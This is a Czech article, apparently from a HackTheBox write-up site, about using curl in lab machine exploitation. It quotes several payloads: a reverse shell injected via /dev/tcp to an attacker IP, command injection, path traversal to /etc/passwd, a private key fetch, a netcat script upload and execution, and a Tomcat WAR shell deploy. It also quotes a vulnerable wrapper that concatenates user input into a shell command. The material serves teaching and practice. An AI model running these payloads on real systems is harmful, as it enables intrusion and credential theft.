## Úvod a kontext

`curl` je v projektu jeden z nejčastějších pomocných nástrojů, ale skoro nikdy nestojí v centru pozornosti. Není to skener ani exploit framework. Je to praktický HTTP klient pro chvíli, kdy už nestačí proklikání v browseru a je potřeba přesně řídit metodu, hlavičky, tělo požadavku, cookies nebo cestu k internímu endpointu.

Na [Controlu](/control) otevře admin rozhraní přes jednu hlavičku, na [Devzatu](/devzat) posílá JSON do interního API, na [Secretu](/secret) nese JWT v hlavičce a na [ServMonu](/servmon) mluví s localhost API přes přeposlaný port. V [Unicode](/unicode) se navíc ukazuje i obrácená perspektiva: `curl` může být sám o sobě nebezpečný, pokud ho privilegovaný wrapper skládá z neověřeného vstupu.

## Co `curl` v praxi řeší

Hodnota `curl` nespočívá v tom, že "umí dělat HTTP". To umí i browser. Hodnota je v tom, že dovolí rychle a přesně sestavit požadavek, který aplikace čeká:

- vlastní hlavičky,
- JSON nebo formulářové tělo,
- PUT a další méně běžné metody,
- volání localhost služby po footholdu nebo přes pivot,
- nahrání souboru,
- nebo stažení artefaktu bez interaktivního prohlížeče.

Právě proto se v místních rozborech objevuje tak často. Jakmile je potřeba odeslat jeden přesný request, `curl` bývá nejrychlejší cesta od hypotézy k ověření.

## Nejčastější scénáře využití v tomto projektu

### Ruční HTTP request s hlavičkami a přesným tělem

Na [Controlu](/control) nestačilo otevřít `admin.php` v browseru. Rozhodující byla specifická hlavička:

```bash
curl -H "X-Forwarded-For: 192.168.4.28" http://control.htb/admin.php
```

Tady `curl` neřeší exploit. Jen dovolí přesně nasimulovat to, co backend považuje za důvěryhodný provoz.

Na [Secretu](/secret) je stejná logika vidět ještě čistěji. Endpoint nevyžadoval jen URL, ale i JWT v nestandardní hlavičce:

```bash
curl -i -H "auth-token: <admin-jwt>" "http://10.10.11.120:3000/api/logs?file=.env;whoami"
```

Na [Devzatu](/devzat) se zase `curl` hodí jako nejjednodušší způsob, jak poslat JSON do API a okamžitě ověřit LFI i command injection:

```bash
curl 'http://pets.devzat.htb/api/pet' --data-raw '{"name":"AAAAA","species":"../../../../../etc/passwd"}'
curl 'http://pets.devzat.htb/api/pet' --data-raw '{"name":"AAAAA","species":"cat;/bin/bash -c '\''bash -i >& /dev/tcp/10.10.14.11/4000 0>&1'\''"}'
```

To je přesně chvíle, kdy browser přestává být pohodlný a `curl` je nejrychlejší cesta k opakovatelnému requestu.

### Práce s localhost a interními API po footholdu nebo pivotu

Jakmile je získaný shell nebo postavený port forward, `curl` často slouží jako jednoduchý průzkumník interních služeb.

Na [Luanne](/luanne) po user footholdu vrací lokální endpoint soukromý klíč:

```bash
curl --user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/id_rsa
```

Na [ServMonu](/servmon) jde přes lokálně přeposlaný port nahrát skript do NSClient++ API a následně ho spustit:

```bash
curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/nc3.bat --data-binary @nc.bat
curl -s -k -u admin "https://localhost:8443/api/v1/queries/nc3/commands/execute?time=3m"
```

Na [Tentacle](/tentacle) se stejný nástroj používá přes [Proxychains](/nastroje/proxychains), protože cílová služba není dosažitelná přímo:

```bash
proxychains curl http://wpad.realcorp.htb/wpad.dat
```

To je praktický pattern, který se opakuje i v dalších článcích: jakmile je interní služba nějakým způsobem dosažitelná, `curl` je první rychlá volba pro její ověření.

### Uploady, deploy a doručení payloadu

`curl` se v projektu často používá i jako čistý transport pro payload nebo deploy artefakt.

Na [Tabby](/tabby) nahrává WAR přímo do Tomcat Manageru:

```bash
curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/rev_shell'
curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/rev_shell/
```

Na [BountyHunteru](/bountyhunter) zase stačí jediný přesný POST s base64-encoded XML, aby bylo možné ověřit XXE workflow. A na [Cerealu](/cereal) `curl` slouží k prostému doručení binárek na host po získání user přístupu.

V tom je jeho síla: pokud endpoint už znáte a potřebujete jen přesně trefit jeho vstup, není nutné sahat po těžším toolingu.

### Bohatý CLI nástroj jako útoková plocha

[Unicode](/unicode) ukazuje důležitou obrácenou perspektivu. Tam nebyl problém v tom, že by útočník `curl` používal přímo. Problém byl v privilegovaném wrapperu `treport`, který sestavoval shellový příkaz nad `curl` z uživatelského vstupu:

```python
cmd = '/bin/bash -c "curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '"'
```

Proto je dobré vnímat `curl` i obranně. Má hodně přepínačů a když se jeho parametry skládají nesprávně, uživatel neovládá jen URL, ale celé chování nástroje. Praktický problém tedy často neleží v `curl` samotném, ale v tom, jak ho volá okolní aplikace.

## Kdy je `curl` nejlepší volba

`curl` se vyplácí hlavně tehdy, když:

- už existuje konkrétní HTTP endpoint,
- potřebujete ručně řídit hlavičky, metodu nebo tělo,
- pracujete s interní nebo localhost službou,
- nebo chcete zautomatizovat několik přesných požadavků bez browseru.

Naopak není ideální volbou, když teprve hledáte útokovou plochu. Tam dává větší smysl nejdřív [WhatWeb](/nastroje/whatweb), [Gobuster](/nastroje/gobuster), [Dirsearch](/nastroje/dirsearch) nebo [Wfuzz](/nastroje/wfuzz).

## Nejčastější chyby v praxi

### Zaměnění transportu za exploit

Na [Controlu](/control), [Secretu](/secret) i [ServMonu](/servmon) `curl` jen doručuje správně sestavený request. Samotná zranitelnost leží jinde:

- v důvěře v hlavičku,
- v command injection,
- nebo v nechráněném admin API.

### Příliš dlouhé zůstávání u browseru

Jakmile je potřeba opakovat stejný request s malými obměnami, browser začíná brzdit. `curl` v takové chvíli zkrátí cestu mezi hypotézou a ověřením.

### Ignorování interní dosažitelnosti

Na [ServMonu](/servmon), [Luanne](/luanne) nebo [Tentacle](/tentacle) nebyl hlavní problém v syntaxi požadavku, ale v tom, jak se k endpointu dostat. `curl` je užitečný až ve chvíli, kdy je vyřešený port forward, proxy nebo foothold.

### Podcenění toho, co všechno `curl` umí

Právě [Unicode](/unicode) připomíná, že wrapper nad `curl` není bezpečný jen proto, že "stahuje soubor". Jakmile vstup ovlivní parametry, může uživatel měnit i výstupní cestu nebo další chování nástroje.

## Co si odnést do praxe

- `curl` je nejpraktičtější jako přesný ruční HTTP klient pro okamžik, kdy už browser nestačí.
- Největší hodnotu má při práci s hlavičkami, JSON API, localhost službami a jednoduchým doručením payloadu.
- Sám o sobě nic neláme. Jen výrazně zrychluje práci tam, kde už víte, jaký request potřebujete poslat.
